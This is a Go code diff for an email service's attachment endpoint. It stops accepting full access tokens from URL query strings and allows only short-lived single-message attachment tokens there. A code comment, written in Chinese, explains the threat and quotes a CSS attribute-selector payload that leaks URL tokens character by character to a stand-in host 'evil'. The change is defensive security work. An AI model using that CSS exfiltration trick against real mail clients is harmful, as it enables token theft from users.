@@ -180,14 +180,24 @@ func (s *Service) IssueAttachmentToken(messageID uint) (string, error) {
 	return s.signToken(fmt.Sprintf("msg:%d", messageID), "attachment", attachmentTokenTTL)
 }
 
-// VerifyAttachmentAccess 校验附件端点的令牌：access token，或限定该邮件的附件令牌。
-func (s *Service) VerifyAttachmentAccess(tokenStr string, messageID uint) error {
+// VerifyAttachmentAccess 校验附件端点的令牌。
+//
+// fromQuery 表示凭据取自 URL query。此时**只**接受限定单封的附件令牌：
+// 附件 URL 会被写进邮件正文文档（cid: 内联图改写），而那份文档的内容由发件人控制，
+// 一段 `img[src^="…eyJhb"]{background:url(https://evil/1)}` 就能用属性前缀选择器
+// 把 URL 里的凭据逐字符问出去，全程不需要执行脚本。凭据既然躲不开这份文档，
+// 那就只能是「只开这一封的附件、一小时过期」的那一种。
+// access token 只在走 Authorization 头时接受（用户主动下载走 axios blob 的路径）。
+func (s *Service) VerifyAttachmentAccess(tokenStr string, messageID uint, fromQuery bool) error {
 	c, err := s.parseToken(tokenStr)
 	if err != nil {
 		return err
 	}
 	switch c.Type {
 	case "access":
+		if fromQuery {
+			return errors.New("access token not accepted from url query")
+		}
 		return nil
 	case "attachment":
 		if c.Username != fmt.Sprintf("msg:%d", messageID) {
